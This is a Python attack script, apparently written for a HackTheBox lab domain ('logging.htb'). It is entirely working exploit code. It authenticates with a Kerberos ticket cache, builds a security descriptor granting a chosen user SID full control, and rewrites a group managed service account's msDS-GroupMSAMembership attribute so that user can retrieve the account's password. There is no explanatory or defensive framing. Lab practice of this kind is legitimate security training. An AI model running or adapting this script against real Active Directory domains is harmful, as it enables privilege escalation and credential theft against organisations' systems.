#!/usr/bin/env python3
import ldap3
from impacket.ldap import ldaptypes
import os

# Use Kerberos ticket
os.environ['KRB5CCNAME'] = 'svc_recovery.ccache'

# :red_circle: MUST use hostname (not IP)
TARGET_HOST = 'dc01.logging.htb'

# Connect using Kerberos (GSSAPI)
server = ldap3.Server(TARGET_HOST)

conn = ldap3.Connection(
    server,
    authentication=ldap3.SASL,
    sasl_mechanism='GSSAPI',
    auto_bind=True
)

print(f"[+] Connected as: {conn.extend.standard.who_am_i()}")

# :warning: NOTE:  use Wallace Everette's ObjectSID from bloodyAD 
target_sid = 'S-1-5-21-4020823815-2796529489-1682170552-2111'

sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 32772
sd['OwnerSid'] = ldaptypes.LDAP_SID()
sd['OwnerSid'].fromCanonical('S-1-5-18')
sd['GroupSid'] = b''
sd['Sacl'] = b''

acl = ldaptypes.ACL()
acl['AclRevision'] = 4
acl['Sbz1'] = 0
acl['Sbz2'] = 0

ace = ldaptypes.ACE()
ace['AceType'] = 0
ace['AceFlags'] = 0

nace = ldaptypes.ACCESS_ALLOWED_ACE()
nace['Mask'] = ldaptypes.ACCESS_MASK()
nace['Mask']['Mask'] = 983551
nace['Sid'] = ldaptypes.LDAP_SID()
nace['Sid'].fromCanonical(target_sid)

ace['Ace'] = nace
acl.aces = [ace]
sd['Dacl'] = acl

gmsa_dn = 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb'

conn.modify(
    gmsa_dn,
    {'msDS-GroupMSAMembership': [(ldap3.MODIFY_REPLACE, [sd.getData()])]}
)

print(f"[+] Result: {conn.result}")

conn.unbind()
